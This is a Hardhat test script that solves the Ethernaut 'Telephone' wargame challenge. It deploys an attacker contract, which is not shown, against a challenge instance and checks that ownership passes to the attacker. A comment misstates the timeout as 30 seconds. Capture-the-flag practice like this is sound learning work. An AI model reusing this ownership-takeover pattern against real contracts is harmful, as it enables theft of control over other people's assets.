const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback Exploit using attack contract", function () {
  let attacker, attackerContract, telephoneContract, newOwner;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x3Ee0F0C3fEEE2F791002Be2fEd842b7b8F9eF329"; //instance address
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    telephoneContract = await ethers.getContractAt(
      "Telephone",
      contractAddress
    );

    console.log("the telephone contract is this", telephoneContract);
  });

  it("perform exploit", async function () {
    // Attack flow

    // Grab the current owner of the victim contract

    let originalOwner = await telephoneContract.owner();

    console.log(`The original owner is ${originalOwner}`);
    // call the attack contract
    let txAttack = await attackerContract.attack(attacker.address);

    await txAttack.wait();

    // check who the new owner is (should be me :)
    newOwner = await telephoneContract.owner();

    console.log(`The new owner is ${newOwner}`);

    // grab the newOwner of the victim contract
  }).timeout(3000000); //Allows the attack to be ran for 30 seconds

  after("confirm exploit", async function () {
    // check if I'm the new owner of the contract
    expect(newOwner).to.be.eq(attacker.address);
  });
});
